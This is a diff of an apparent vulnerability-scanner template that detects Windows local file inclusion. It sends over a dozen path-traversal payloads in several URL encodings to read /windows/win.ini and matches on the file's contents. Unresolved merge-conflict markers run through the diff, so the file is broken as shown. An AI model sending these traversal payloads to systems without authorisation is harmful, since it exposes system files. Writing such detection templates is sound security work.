@@ -2,9 +2,16 @@ id: generic-windows-lfi
 
 info:
   name: Windows - Local File Inclusion
+<<<<<<< HEAD
   author: mesaglio,sushantkamble
   severity: high
   description: Windows is vulnerable to local file inclusion because of searches for /windows/win.ini on passed URLs.
+=======
+  author: mesaglio,sushantkamble,ritikchaddha
+  severity: high
+  description: |
+    Windows is vulnerable to local file inclusion because of searches for /windows/win.ini on passed URLs.
+>>>>>>> 5d36d276 (add new stuff)
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
@@ -24,15 +31,37 @@ requests:
       - "{{BaseURL}}/?redirect=..%2f..%2f..%2f..%2fwindows/win.ini"
       - "{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini"
       - "{{BaseURL}}/?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini"
+<<<<<<< HEAD
+=======
+      - "{{BaseURL}}/..///////..////..//////windows/win.ini"
+      - "{{BaseURL}}/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini"
+      - "{{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
+      - "{{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00"
+      - "{{BaseURL}}/index.php?page=windows/win.ini"
+      - "{{BaseURL}}/index.php?page=windows/win.ini%00"
+      - "{{BaseURL}}/index.php?page=../../windows/win.ini"
+      - "{{BaseURL}}/index.php?page=....//....//windows/win.ini"
+      - "{{BaseURL}}/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini"
+      - "{{BaseURL}}/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini"
+      - "{{BaseURL}}/../../../../../../../../../windows/win.ini"
+      - "{{BaseURL}}/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini"
+>>>>>>> 5d36d276 (add new stuff)
 
     stop-at-first-match: true
     matchers:
       - type: word
+<<<<<<< HEAD
+=======
+        part: body
+>>>>>>> 5d36d276 (add new stuff)
         words:
           - "bit app support"
           - "fonts"
           - "extensions"
         condition: and
+<<<<<<< HEAD
         part: body
+=======
+>>>>>>> 5d36d276 (add new stuff)
 
 # Enhanced by mp on 2022/07/22
